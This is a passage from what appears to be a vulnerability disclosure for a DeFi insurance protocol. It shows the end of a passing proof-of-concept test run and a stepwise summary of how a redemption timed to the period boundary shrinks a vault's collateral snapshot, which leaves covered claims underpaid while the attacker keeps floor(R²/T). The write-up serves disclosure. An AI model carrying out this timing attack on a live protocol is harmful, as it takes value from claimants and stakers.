      - every scenario uses a properly funded + approved 10 USDC FLB
      - buyer is funded/approved before matching and loss occurs after settlement
      - attacker helper holds zero shares and is allowance-only
      - wrong-time execution reverts without spending shares or allowance
      - unauthorized helper callers are rejected
      - allocator commit and redemption execute in the same exact-boundary block
      - allocator commitment executes before attacker redemption
      - buyer vault-leg shortfall equals the boundary redemption exactly
      - attacker preserves floor(R^2/T), so benefit remains positive below dominant ownership
      - incident closes despite the shortfall

      RESULT: the bug is protocol-side rather than dependent on a 100% attacker vault. Any non-zero boundary redemption lowers the valid claim payout by that redeemed amount even though the assets never leave the vault; the attacker personally preserves floor(R^2/T) while the remainder of the shortfall stays with active stakers.
  ✔ proves exact-boundary ordering, safe allowance-only conditionality, funded FLB, and 10%/50%/100% ownership economics (6972ms)

1 passing (7s)
```

## What the PoC proves

{% stepper %}
{% step %}

## Funding and settlement conditions

The FLB is funded and approved.

The buyer is funded and approved before matching.

The loss occurs only after settlement.
{% endstep %}

{% step %}

## Helper and boundary execution conditions

The helper owns zero shares.

The attacker remains share owner and grants only allowance.

Unauthorized helper calls revert.

Wrong-time helper calls revert without spending shares or allowance.

Commitment and redemption execute in the exact same boundary block.

Commitment executes first.

Redemption executes second.
{% endstep %}

{% step %}

## Snapshot mutation and settlement

The commitment records full pre-redemption capacity.

Redemption lowers `totalAssetsAt(periodStart)` by exactly `R`.

Redeemed assets never leave the vault.

Redeemed assets remain in delayed-withdrawal accounting intended to stay slashable.

Settlement still succeeds against the stored commitment.

Premium is collected.
{% endstep %}

{% step %}

## Payout impact and attacker benefit

Loss occurs only after settlement.

Assessment is valid and within settled cover.

Funded FLB pays normally.

Vault-leg shortfall equals `R`.

Incident becomes `CLOSED` despite that shortfall.

The same protocol-side invariant holds at 10%, 50%, and 100% attacker ownership.

Attacker personally preserves `floor(R² / T)`.

Attacker benefit remains positive below dominant ownership.
{% endstep %}
{% endstepper %}

This demonstrates a mutable current-period collateral exposure snapshot, not a trusted-role business decision, FLB configuration issue, delayed-premium issue, stale-capacity issue, or cross-period liability-reservation issue.
